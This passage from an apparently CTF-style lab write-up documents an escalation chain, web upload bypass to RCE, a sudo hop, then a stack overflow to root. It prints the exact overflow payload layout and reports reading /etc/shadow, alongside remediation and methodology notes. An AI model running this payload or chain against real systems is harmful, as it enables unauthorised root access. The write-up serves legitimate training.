+<p><code>RC=139</code> is <strong>not a failed exploit</strong> and this is worth stating because it looks like one. It is the <code>SIGSEGV</code> from <code>fire</code>'s own <code>pop rbp; ret</code> into stack garbage <em>after</em> <code>system(&quot;/bin/sh&quot;)</code> has already returned. The root shell ran, executed six commands, and exited; then the corrupted frame took the process down. Reading the exit status as the verdict would have made me re-run a working exploit eight more times.</p>
+<p><strong>Payload</strong> (89 bytes; offset 72 is <code>main</code>'s consumed return slot, offset 80 is the alignment trampoline — see §1.4):</p>
+<pre><code>'A'*64  'B'*8  p64(0x40139d)  p64(0x40136a)  '\n'
+                    ^ret trampoline  ^fire: setuid(0); system(&quot;/bin/sh&quot;)
+</code></pre>
+<p><strong>Root cause.</strong> A setuid-root binary that reads unbounded input into a fixed stack buffer, compiled with no stack protector, containing a function that unconditionally escalates. Three defects, one gadget. <strong>Remediation:</strong> remove setuid (the program does not need root for anything it does), add <code>-fstack-protector-strong</code> and <code>-D_FORTIFY_SOURCE=2</code>, bound the read, and delete <code>fire</code>.</p>
+<h3 id="36-no-web-logging-at-all--cwe-778">3.6 No web logging at all — CWE-778</h3>
+<pre><code>$ ls -l /var/log/apache2/
+lrwxrwxrwx 1 root root  9 access.log -&gt; /dev/null
+lrwxrwxrwx 1 root root  9 error.log  -&gt; /dev/null
+-rw-r----- 1 root adm 1357 other_vhosts_access.log
+</code></pre>
+<p>Every <code>ErrorLog</code> and <code>CustomLog</code> in the vhost configuration points at <code>${APACHE_LOG_DIR}/error.log</code> and <code>…/access.log</code>, <strong>and both of those are symlinks to <code>/dev/null</code>.</strong> All four vhosts write to a black hole. The one file with content is Debian's stock <code>other_vhosts_access.log</code>, holding eight build-time lines, every one against the catch-all:</p>
+<pre><code>[net-0-2]:80 … &quot;GET /&quot; 301 553
+[net-0-2]:80 … &quot;GET /index.php HTTP/1.1&quot; 404 489
+[net-0-2]:80 … &quot;GET /index.html HTTP/1.1&quot; 404 489
+</code></pre>
+<p><strong>This has a direct consequence for the methodology, and it is the more useful half.</strong> Every request in this engagement — the vhost sweep, the upload, the RCE, the privilege escalation — left <strong>no trace in any log on the target</strong>. Log-based corroboration was not merely unavailable, it was actively destroyed. Every finding in this writeup rests on live response bodies and on <code>id</code> output, which is the correct evidence class anyway, but an analyst who planned to retro-validate the attack from logs would have concluded <strong>no attack happened</strong>, because none was recorded.</p>
+<p><strong>Remediation.</strong> Point the logs at real files, ship them off-host, and alert on the unauthenticated admin vhost.</p>
+<h3 id="37-findings-present-but-not-used">3.7 Findings present but not used</h3>
+<ul>
+<li><strong>Dead vhost configuration.</strong> Vhost 2 is unreachable (§2.2). Reported as a configuration defect, not exploited — and worth noting that an admin who &quot;fixed&quot; vhost 1's <code>ServerName</code> would silently promote a duplicate.</li>
+<li><strong>The ROT-14 encoder as a cipher.</strong> It is a fixed, keyless Caesar shift; <code>converts.txt</code> is a plaintext log of every user's submission. Not used: no data in it to decrypt and the XSS is the same file.</li>
+<li><strong><code>.pht</code> / <code>.php5</code> / <code>.php7</code> accepted but inert.</strong> Stored in the document root as source-readable PHP. Not used, and correctly so: the same finding as §3.1, a worse payload, no additional capability. Listed because their presence means <strong>PHP source is publicly readable at a known path</strong>, which is a disclosure in its own right even though it discloses nothing secret today.</li>
+<li><strong><code>converts.txt</code> is world-readable at <code>/converts.txt</code>.</strong> Unauthenticated, append-only, and it reflects every visitor's input. Low severity today; it becomes a finding the moment anyone pastes a secret into the encoder.</li>
+</ul>
+<h3 id="38-controls-that-held">3.8 Controls that held</h3>
+<p>Each with the control that proves it could have failed.</p>
+<ul>
+<li><strong>The sudoers path control held.</strong> <code>www-data</code> cannot write <code>/usr/bin/busybox</code> nor <code>/usr/bin</code>. <em>Positive control:</em> the same <code>test -w</code> <strong>as root</strong> returns writable (§1.2) — the control demonstrably fires, and it fires <em>against</em> the finding, which is what makes it trustworthy.</li>
+<li><strong>The upload extension filter fires.</strong> <code>.php</code> and <code>.PHP</code> are both refused, verified twice. The filter is real; it is one value wide.</li>
+<li><strong>The sudoers rule is scoped, not <code>ALL</code>.</strong> <em>Positive control:</em> <code>sudo -n -u astu /usr/bin/id</code> and <code>sudo -n -u astu /bin/sh</code> both return <code>sudo: a password is required</code>, <code>exit=1</code>. The allowlist cannot be walked around by naming a different binary.</li>
+<li><strong><code>www-data</code> cannot read <code>bs64</code>.</strong> <code>[lab-home]/astu</code> is <code>drwx------</code>; <code>cat</code> and <code>gdb</code> both return <code>Permission denied</code>. I had to take the sudo hop before the binary was analysable at all.</li>
+<li><strong>No anonymous <code>root</code> path exists in the pool.</strong> <code>id</code> inside the RCE returned <code>uid=33(www-data)</code> every time, across four separate primitives. The chain has exactly the three hops the source predicts, and no boundary was crossed that I did not measure.</li>
+<li><strong>PHP is not enabled in the admin vhost's own root</strong> — the uploaded <code>.phtml</code> executes only under <code>crosswords</code>, not under <code>admin</code>. Untested as a control; noted so a reader does not assume the two roots behave alike.</li>
+</ul>
+<hr />
+<h2 id="4-control-tests-with-positive-controls">4. Control tests, with positive controls</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Claim</th>
+<th>Control</th>
+<th>Positive control (proves it can fail)</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>f7cca221daa35bdc</code> is the baseline</td>
+<td>Two names that cannot exist</td>
+<td><code>admin.crosswords.5eEk3r.dl</code> yields a <em>different</em> hash</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td>3 real hosts</td>
+<td>Hash clustering over 17 names</td>
+<td>2 of 3 hashes each held by exactly 1 name</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Body hash is a valid discriminator</td>
+<td>3 reads, no writes</td>
+<td>Crosswords hash moved on 3 consecutive reads (§5.1)</td>
+<td><strong>Conditional — see §5.1</strong></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>.php</code> filter is live</td>
+<td>Upload <code>.php</code></td>
+<td><code>.phtml</code> accepted in the same request</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>.phtml</code> executes</td>
+<td><code>GET</code> it</td>
+<td><code>.html</code> and <code>.php5</code> served as source</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>6</td>
+<td>RCE identity</td>
+<td><code>id</code> first</td>
+<td>—</td>
+<td><code>uid=33(www-data)</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>sudoers target not writable</td>
+<td><code>test -w</code> <strong>as www-data</strong></td>
+<td>Same test as root says writable</td>
+<td><strong>Confirmed, control held</strong></td>
+</tr>
+<tr>
+<td>8</td>
+<td>sudo allowlist is narrow</td>
+<td><code>sudo -u astu /usr/bin/id</code></td>
+<td><code>/usr/bin/busybox</code> succeeds</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>9</td>
+<td>setuid path is live</td>
+<td><code>NoNewPrivs</code>, mount opts</td>
+<td><code>/</code> has no <code>nosuid</code></td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>10</td>
+<td>Overflow offset is 72</td>
+<td>Read the frame; <code>gdb</code> dump</td>
+<td>72 A's <code>SIGSEGV</code>s, 71 does not</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>11</td>
+<td>Traversal deletes a real file</td>
+<td>Read durable state</td>
+<td><code>benign.html</code> deleted by basename</td>
+<td><strong>Confirmed</strong></td>
+</tr>
+<tr>
+<td>12</td>
+<td><code>converts.txt</code> reflects stored input</td>
+<td><code>cat</code> as www-data</td>
+<td>—</td>
+<td>Live <code>&lt;script&gt;</code> present</td>
+</tr>
+<tr>
+<td>13</td>
+<td>No reward exists</td>
+<td>§7</td>
+<td>—</td>
+<td><strong>Absence established</strong></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="5-chain-with-order-and-justification">5. Chain, with order and justification</h2>
+<h3 id="51-the-path-taken">5.1 The path taken</h3>
+<ol>
+<li><strong>TCP full scan.</strong> One port, <code>80/tcp</code>, Apache 2.4.62. No SSH — so the foothold has to be web, and &quot;Linux privilege escalation&quot; has to start from a code-execution primitive rather than a login. (<code>nmap -p-</code> is TCP; UDP coverage is declared in §2.1 and is a stated gap, not a closed port.)</li>
+<li><strong>Read the vhost config before attacking anything.</strong> Four vhosts; three reachable. This is where the lab's whole shape became visible, and it cost one <code>cat</code>.</li>
+<li><strong>Vhost sweep with a body-hash discriminator, including two provably-absent controls.</strong> 17 names → 3 hashes. This is the finding: <code>admin.5eEk3r.dl</code> is baseline, the real admin is <code>admin.crosswords.5eEk3r.dl</code>.</li>
+<li><strong>Found the panel with no credential.</strong> <code>200</code>, no session anywhere in the codebase.</li>
+<li><strong>Read the upload handler and the delete handler before probing them.</strong> Predicted the one-string filter and the missing <code>basename()</code>; then confirmed both.</li>
+<li><strong>Self-tested the filter</strong> — <code>.php</code> refused, <code>.phtml</code> accepted — so the acceptance meant something.</li>
+<li><strong>Established the MIME map empirically</strong>, extension by extension, with <code>.html</code> as the negative control.</li>
+<li><strong><code>id</code> first</strong>: <code>uid=33(www-data)</code>. Three hops predicted, three measured.</li>
+<li><strong>Read sudoers and the target's permissions as <code>www-data</code>, not as root.</strong> Control held; the documented shortcut does not apply.</li>
+<li><strong><code>sudo -u astu</code> → <code>uid=1000(astu)</code>.</strong> Became the only identity that can read <code>bs64</code>.</li>
+<li><strong>Read <code>bs64</code>'s source before exploiting it.</strong> Found the overflow, the missing canary, and <code>fire</code> — and found that <code>main</code> never calls <code>fire</code>.</li>
+<li><strong>Located the frame by reading the prologue, confirmed under <code>gdb</code>.</strong> Built <code>ret2ret</code> for alignment. <strong>Delivered the payload through a FIFO</strong> because sudo's PTY eats NULs.</li>
+<li><strong><code>id</code> at the end</strong>: <code>uid=0(root)</code>, <code>/etc/shadow</code> read.</li>
+</ol>
+<h3 id="52-what-each-step-bought">5.2 What each step bought</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Bought</th>
+<th>Cost if skipped</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>vhost config read</td>
+<td>The entire application map, pre-attack</td>
+<td>Hours of black-box guessing; the nested <code>admin.crosswords</code> is not guessable</td>
+</tr>
+<tr>
+<td>Body-hash sweep</td>
+<td>3 hosts, correctly</td>
+<td>17 &quot;hosts&quot;, 14 of them invented</td>
+</tr>
+<tr>
+<td>Source read</td>
+<td>Predicted filter + traversal before probing</td>
+<td>A filter read as validation rather than as one string</td>
+</tr>
+<tr>
+<td><code>id</code> on each primitive</td>
+<td>Correct hop count, correct severities</td>
+<td>Reporting a 1-hop chain that is 3</td>
+</tr>
+<tr>
+<td><code>test -w</code> as <code>www-data</code></td>
+<td>Kept a <em>false</em> escalation out of the report</td>
+<td>A fabricated critical finding</td>
+</tr>
+<tr>
+<td><code>bs64</code> source read</td>
+<td>The overflow, not the strings</td>
+<td>Chasing a &quot;root shell&quot; the binary never gives</td>
+</tr>
+</tbody>
+</table>
+<h3 id="53-reward">5.3 Reward</h3>
+<p><strong>There is none.</strong> This is the eighth consecutive lab in the series with no <code>FLAG{}</code>, and I am reporting the absence rather than manufacturing a value.</p>
+<p>Exhaustive search, as root after §3.5:</p>
+<pre><code># no flag-like file anywhere on the filesystem
+find / -xdev \( -iname '*flag*' -o -iname '*secret*' -o -iname '*reward*' \
+                -o -iname '*.flag' -o -iname 'token*' -o -iname '*key*' \) 2&gt;/dev/null
+  → /etc/apt/keyrings
+  → /etc/php/8.2/mods-available/tokenizer.ini
+  → /var/lib/php/modules/8.2/{cli,registry,apache2}/enabled_by_maint/tokenizer
+  (no reward artefact; all hits are distro files)
+
+# no flag string in any readable text
+grep -rIl -E 'FLAG\{|flag\{|[Ff]lag:' /  → only perl/CPAN docs, gdb python,
+                                                  asm-generic headers, one XHTML spec
+
+# what the image actually added at build time
+find / -xdev -newermt 2025-01-01 ! -newermt 2025-02-01 -type f | grep -vE '^/(usr|proc|sys|var/lib|…)'
+  /var/www/5eEk3r/index.html
+  /var/www/crosswords/web/index.php
+  /var/www/crosswords/web/styles.css
+  /var/www/crosswords/admin/index.php
+  /etc/apache2/sites-available/000-default.conf
+  /etc/sudoers  /etc/passwd  /etc/shadow  /etc/group  …
+</code></pre>
+<p>The build-window diff is decisive: <strong>the image contains exactly the lab's own five web files, one vhost config, and the account database. There is no reward file to find</strong>, and root access does not change that.</p>
+<p>I also checked the two places a reward is commonly hidden and are worth recording as <em>checked and empty</em>: <code>/root</code> holds only <code>.bashrc</code>, <code>.profile</code>, <code>.local</code>, and a <code>.bash_history</code> symlinked to <code>/dev/null</code> — and <code>/var/log/apache2/other_vhosts_access.log</code> is eight build-time lines against the catch-all (lab 26's equivalent file held 21 001 lines of the author's own <code>Wfuzz</code> run; here it is 8 lines and they are all <code>404</code>/<code>301</code>).</p>
+<p><strong>Per <code>decision-making.md</code>, the unclosed vector matters more than the absence.</strong> There is no vector I discarded for lack of time. The three real hosts were all reached, both PHP files were read in full, the sudoers file was read in full, and <code>bs64</code> was read at the instruction level. The reward is not hidden behind a step I skipped.</p>
+<hr />
+<h2 id="6-not-tested-vs-discarded-with-reason">6. Not tested vs discarded with reason</h2>
+<p><strong>Not tested</strong> (honest coverage gap):</p>
+<ul>
+<li><strong>UDP.</strong> <code>nmap -sU</code> needs root and is unavailable on this host. Mitigated by an empty <code>/proc/net/udp</code> and a single-service entrypoint, but the scan itself was not run.</li>
+<li><strong>The stored XSS in a real browser.</strong> I proved the payload is served raw and that a live <code>&lt;script&gt;</code> tag is in the body. I did not drive a headless browser, so I have not observed script execution in a DOM. Rated as stored script execution in the origin, not as observed cookie theft — and since the lab has no session, there was nothing to steal anyway.</li>
+<li><strong>Whether <code>.htaccess</code> could re-enable more extensions.</strong> <code>AllowOverride All</code> is set on both roots, so a <code>.html</code> upload could in principle carry a <code>SetHandler</code>. Untested; it would not change the severity, which is already full RCE.</li>
+<li><strong>Post-root persistence and exfiltration.</strong> Root was obtained to prove the finding; I did not modify the target beyond the files I uploaded into the web root.</li>
+</ul>
+<p><strong>Discarded with reason:</strong></p>
+<ul>
+<li><strong>Replacing <code>/usr/bin/busybox</code>.</strong> The documented sudoers-filesystem oracle. Discarded on measurement: root-owned <code>0755</code>, unwritable by <code>www-data</code> (§1.2). Not &quot;probably blocked&quot; — tested, and the control held.</li>
+<li><strong>Payload as an argument to the sudo-allowed command.</strong> <code>sudo -u astu /usr/bin/busybox &lt;anything&gt;</code> is permitted, and busybox takes an applet name as <code>argv[1]</code>, so <code>busybox sh -c …</code> is a legitimate use. What is <em>not</em> available is argument injection into a privileged program: every non-<code>busybox</code> path returns <code>sudo: a password is required</code>.</li>
+<li><strong>Buffer overflow in <code>to_base64</code>.</strong> Its 3-byte group buffer is <code>-0x50(%rbp)</code> in a <code>0x60</code> frame — 16 bytes for 3, correctly bounded. Reading it was cheaper than testing it.</li>
+<li><strong>Interpreting <code>bs64</code>'s <code>strings</code> as the exploit.</strong> Discarded on the disassembly: <code>main</code> never calls <code>fire</code>.</li>
+<li><strong>The default vhost as a finding.</strong> It serves the stock Apache page and nothing else. It is the ruler in §2.3, not a discovery.</li>
+</ul>
+<hr />
+<h2 id="7-design-observation--and-the-one-new-rule-this-lab-yields">7. Design observation — and the one new rule this lab yields</h2>
+<h3 id="71-the-lab-is-the-counter-example-to-its-own-predecessor">7.1 The lab is the counter-example to its own predecessor</h3>
+<p>Fifteen labs in, the pattern has been that the description is narrative. This one is not: <em>&quot;fuzzing de subdominios (virtual hosting) y escalada de privilegios en Linux&quot;</em> is <strong>both halves true</strong>, and unusually the vhosting half is a genuine two-sided lesson.</p>
+<p>Lab 26 taught: <em>a name that responds is not a host.</em> Six names, six identical normalised hashes, including an invented TLD — the catch-all.</p>
+<p>This lab teaches the half lab 26 could not: <em>a name that responds <strong>differently</strong> is a host, and the obvious name is the decoy.</em> <code>admin.5eEk3r.dl</code> responds <code>200</code> and is nothing. <code>admin.crosswords.5eEk3r.dl</code> responds <code>200</code> and is a file manager with no authentication. <strong>Both answer <code>200</code>.</strong> The status code carries zero information; only the body differential does.</p>
+<p>A rule observed in one direction is an anecdote. This is now observed in both, and the two halves are what make the discriminator implementable:</p>
+<ul>
+<li><strong>Direction A (wildcard).</strong> Many names → one hash. The repeated hash is the baseline. Enumerating finds <em>nothing</em>; the config file is the only source.</li>
+<li><strong>Direction B (real vhosting).</strong> Many names → <em>one</em> hash for the baseline and <em>one each</em> for the real hosts. The singleton hashes are the hosts. Enumerating finds <em>everything</em> — including a nested label no wordlist has.</li>
+</ul>
+<p>The operational consequence is the part I would want a reader to keep: <strong>in both directions the answer is &quot;count the distinct hashes,&quot; but the two directions give opposite verdicts about whether your sweep worked.</strong> A sweep that finds one hash found nothing. A sweep that finds three found everything. The same computation, and the interpretation is where the error happens.</p>
+<p>And the trap that makes this lab worth the hours: <strong>the name that looks most like the answer is the wrong one.</strong> Not a decoy planted in the config — a decoy produced by the catch-all, from a name that is not in the configuration at all. No amount of reading the config would have produced <code>admin.5eEk3r.dl</code>, and no amount of trusting a wordlist would have found <code>admin.crosswords.5eEk3r.dl</code>. Only the body differential, run against a name proven not to exist, distinguishes them.</p>
+<h3 id="72-the-new-detector--and-it-is-the-shape-this-repository-keeps-asking-for">7.2 The new detector — and it is the shape this repository keeps asking for</h3>
+<p>The advice in circulation is <em>&quot;normalise and compare body hashes.&quot;</em> It is right, and on this target it <strong>fails on one of the three hosts</strong>, in a way that produces a false negative disguised as a success.</p>
+<p><code>crosswords.5eEk3r.dl</code> renders <code>converts.txt</code>, which grows on every POST. Three consecutive reads, with a POST between each:</p>
+<pre><code>before-post #1 crosswords hash=4b7a335063149a97
+before-post #2 crosswords hash=cdd9cfc34b4b0cfd
+before-post #3 crosswords hash=2890b20b3bbdfd97
+</code></pre>
+<p><strong>Three reads, three hashes, from a host that never changed.</strong> The stock advice says: <em>if all your hashes differ, your discriminator is wrong, not your hosts.</em> Here the discriminator is right, the hosts are right, and the <strong>content</strong> is moving. And the stock advice is dangerous here, because &quot;every name returned a different hash&quot; is the <em>most successful-looking</em> possible output — it looks like a rich enumeration.</p>
+<p>The fix is one control, and it is the same obligation as every other control in this repository: <strong>prove the detector is connected before you believe its output.</strong></p>
+<pre><code># read each host three times with NO writes in between
+after-post #1 crosswords hash=161f8b02abdec038
+after-post #2 crosswords hash=161f8b02abdec038
+after-post #3 crosswords hash=161f8b02abdec038
+after-post #1 admin     hash=d27ab5a7e81c580d
+after-post #2 admin     hash=d27ab5a7e81c580d
+</code></pre>
+<p>Three identical hashes once the writes stop. The static baseline <code>f7cca221daa35bdc</code> was <strong>byte-identical before and after the entire engagement</strong>, including after I had uploaded a dozen files into the tree.</p>
+<p>So the rule, and it cannot fail in its incorrect form:</p>
+<blockquote>
+<p><strong>A body-hash vhost discriminator must be preceded by a stability control: read each candidate host N times with no writes, and require the hash to repeat. A host whose hash moves is a host with dynamic content and is not thereby a different host; a host whose hash is stable and differs from the baseline is a real host. Only after stability is established does &quot;all hashes differ&quot; become a signal that the <em>discriminator</em> is wrong.</strong></p>
+</blockquote>
+<p>This is <code>decision-making.md</code>'s <em>&quot;a detector pointed at something that does not exist returns a clean, believable negative&quot;</em> — with the twist that makes it worse. That one returns a <strong>false negative</strong>; this one returns a <strong>false positive</strong>, dressed as a successful enumeration, and the natural reading of the output (&quot;I found many distinct hosts!&quot;) is the opposite of the truth. It is also a <em>content</em>-class sibling of the XSS disclosure-surface trichotomy: reachability was never in question, the body was what misreported, and the difference between &quot;a value&quot; and &quot;a moving value&quot; is the difference between a finding and a fabricated one.</p>
+<h3 id="73-the-sudoers-pty-defect-which-generalises-past-exploitation">7.3 The sudoers-PTY defect, which generalises past exploitation</h3>
+<p><code>Defaults use_pty</code> in <code>/etc/sudoers</code> — one line, present on most Debian-family hosts — silently drops NUL bytes from anything written to a <code>sudo</code>'d command's stdin, because a canonical-mode PTY discards them.</p>
+<p>I lost a full diagnostic cycle to it, and the symptom is maximally misleading: <strong>the exploit works perfectly under <code>gdb</code>, because <code>gdb</code> redirects stdin from a file.</strong> So the debugger confirms the payload is correct while the live run fails, and the natural conclusion — <em>my offset is wrong</em> — sends you back to the frame layout, which was right all along. Two unrelated causes produced one identical symptom.</p>
+<p>The rule: <strong>a binary payload must be delivered over a channel that is provably byte-transparent, and the proof is <code>od</code>-ing what the far end received.</strong> A pipe is byte-transparent; a canonical-mode PTY is not; a FIFO is byte-transparent; <code>expect</code> is not. When an exploit's behaviour differs between a debugger and a live shell, <strong>the transport is the first thing to suspect</strong>, before the payload, because the debugger is the one context where the two environments are guaranteed to differ.</p>
+<p>This is the same shape as the repository's relay-and-source-port rule, and it is the second instance of a transport that is invisible in the output and silently changes the bytes.</p>
+<hr />
+<h2 id="8-what-this-lab-adds-to-the-methodology">8. What this lab adds to the methodology</h2>
+<ol>
+<li><strong>The vhost rule, now with both directions.</strong> Wildcard confirmed in lab 26; real vhosting confirmed here, with the flat-<code>admin</code>-is-a-decoy case that a wordlist cannot solve. Same computation, opposite verdicts — §7.1.</li>
+<li><strong>The hash-stability control</strong>, §7.2. New, and it is the first detector in this repository's catalogue whose incorrect form produces a <em>false positive</em> that reads as success.</li>
+<li><strong>A privileged-tool contamination rule</strong>, §1.2. <em>Any</em> filesystem-control claim in a privilege-escalation finding must name the identity that was tested, because the tools an assessor reaches for — <code>docker exec</code>, <code>kubectl exec</code>, root Burp — always report the privileged answer. Generalises the existing execution-identity rule from RCE to escalation.</li>
+<li><strong>The byte-transparent-delivery rule</strong>, §7.3. <code>sudo</code>'s <code>use_pty</code> is a one-line default that silently corrupts binary payloads, and a debugger masks it.</li>
+<li><strong>An exit status is not a verdict.</strong> <code>RC=139</code> after a successful root shell is <code>fire</code> crashing <em>after</em> <code>system()</code> returned. Reading the exit code of a corrupting exploit as its success criterion sends you to re-debug a working exploit — the mirror image of <em>an error oracle with N indistinguishable outcomes</em>, one level out.</li>
+<li><strong><code>fire</code> is a label too.</strong> <code>strings</code> said <code>Ejecutando /bin/sh</code>; <code>main</code> never calls <code>fire</code>. Fifteenth confirmation that a self-documenting artefact is a stopping condition, and the first time the label was on a <em>function the compiler kept but the program never calls</em> — which is why it is more convincing than a comment, and more wrong.</li>
+</ol>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
